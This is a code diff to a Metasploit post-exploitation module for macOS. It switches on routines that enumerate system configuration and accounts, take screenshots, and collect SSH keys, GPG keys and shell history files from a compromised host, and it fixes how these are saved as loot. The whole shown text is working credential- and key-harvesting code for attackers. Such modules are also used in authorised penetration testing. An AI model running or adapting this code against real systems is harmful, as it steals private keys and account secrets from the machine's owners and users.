@@ -55,10 +55,10 @@ class Metasploit3 < Msf::Post
       print_status("This session is running as root!")
     end
 
-    # enum_conf         if datastore['SYSCONF']
-    # enum_accounts     if datastore['ACCOUNTS']
-    # get_crypto_keys
-    # screenshot        if datastore['SCREENSHOT']
+    enum_conf         if datastore['SYSCONF']
+    enum_accounts     if datastore['ACCOUNTS']
+    get_crypto_keys
+    screenshot        if datastore['SCREENSHOT']
     dump_hashes       if datastore['HASHES'] and root?
     dump_bash_history if datastore['SHELLHISTORY']
     get_keychains     if datastore['KEYCHAINS']
@@ -169,9 +169,10 @@ class Metasploit3 < Msf::Post
     if home_folder_list.include?("\.ssh")
       print_status("#{home_dir user}.ssh Folder is present")
       cmd_exec("/bin/ls -ma #{home_dir user}.ssh").chomp.split(", ").each do |k|
-        next if OSX_IGNORE_FILES.include? k
+        path = "#{home_dir user}.ssh/#{k}"
+        next if OSX_IGNORE_FILES.include?(k) or directory?(path)
         print_status("\tDownloading #{k.strip}")
-        add_loot("#{name}", read_file("#{home_dir user}.ssh/#{k}"))
+        add_loot("ssh_#{k}.txt", read_file(path))
       end
     end
   end
@@ -184,9 +185,10 @@ class Metasploit3 < Msf::Post
       print_status("#{home_dir user}.gnupg Folder is present")
       gnugpg_folder = cmd_exec("/bin/ls -ma #{home_dir user}.gnupg").chomp.split(", ")
       gnugpg_folder.each do |k|
-        next if OSX_IGNORE_FILES.include? k
+        path = "#{home_dir user}.gnupg/#{k.strip}"
+        next if OSX_IGNORE_FILES.include?(k) or directory?(path)
         print_status("\tDownloading #{k.strip}")
-        add_loot("#{name}", read_file("#{home_dir user}.gnupg/#{k.strip}"))
+        add_loot("gpg_#{k}.txt", read_file(path))
       end
     end
   end
@@ -195,7 +197,6 @@ class Metasploit3 < Msf::Post
   def get_crypto_keys
     # Enumerate and retreave files according to privilege level
     if not root?
-      # Enumerate the home folder content
       get_ssh_keys(whoami)
       get_gpg_keys(whoami)
     else
@@ -241,7 +242,7 @@ class Metasploit3 < Msf::Post
       if f =~ /\.\w*\_history/
         print_status("\tHistory file #{f.strip} found for #{user}")
         print_status("\tDownloading #{f.strip}")
-        add_loot("root_#{f.strip}.txt", read_file("#{homedir}#{f.strip}"))
+        add_loot("#{user}_#{f.strip}.txt", read_file("#{home_dir user}#{f.strip}"))
       end
     end
   end
@@ -280,7 +281,8 @@ class Metasploit3 < Msf::Post
   def add_loot(filename, data)
     mimetypes = Hash.new('text/plain').merge!({
       '.jpg' => 'image/jpg',
-      '.keychain' => 'application/x-octet-stream'
+      '.keychain' => 'application/x-octet-stream',
+      '.txt' => 'text/plain'
     })
     p = store_loot(
       File.basename(filename, '.*'), # filename without extension
